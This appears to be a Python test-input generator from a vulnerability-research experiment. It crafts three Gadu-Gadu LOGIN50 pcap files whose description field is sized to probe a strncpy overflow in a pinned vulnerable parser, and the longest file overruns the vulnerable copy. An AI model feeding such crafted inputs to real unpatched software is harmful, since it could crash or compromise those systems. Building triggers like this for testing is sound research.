#!/usr/bin/env python3
"""Craft the three chosen-description Gadu-Gadu LOGIN50 pcaps of Experiment D.

No network I/O. The caller must already have the pinned vulnerable source tree;
this generator only reuses the frame builder from ../live/mkggpcap.py and
recomputes the TCP checksum after substituting a known description pattern:
description[i] = (0x41 + i) mod 256. Safe version 0x2a ("7.7") isolates the
tbuf2 strncpy sink from the gg_get_version sink.
"""
import pathlib
import struct
import sys

HERE = pathlib.Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent / "live"))
import mkggpcap as m  # noqa: E402


def frame(payload_len):
    p = bytearray(m.packet(0x2a, payload_len=payload_len))
    off = 14 + 20 + 20 + 30  # eth + ip + tcp + LOGIN50 description offset
    n = payload_len - 30
    p[off:off + n] = bytes((0x41 + i) % 256 for i in range(n))
    p[50:52] = b"\0\0"
    tcp = bytes(p[34:])
    pseudo = bytes([192, 168, 1, 10]) + bytes([192, 168, 1, 20])
    pseudo += struct.pack("!BBH", 0, 6, len(tcp))
    p[50:52] = struct.pack("!H", m.csum(pseudo + tcp))
    return bytes(p)


if __name__ == "__main__":
    for name, plen in (("gg-desc-safe", 92), ("gg-desc-edge", 101),
                       ("gg-desc-long", 140)):
        m.write_pcap(str(HERE / (name + ".pcap")), [frame(plen)])
        print(name, "gg->len", plen - 8, "vulnerable copy_len", plen - 30)
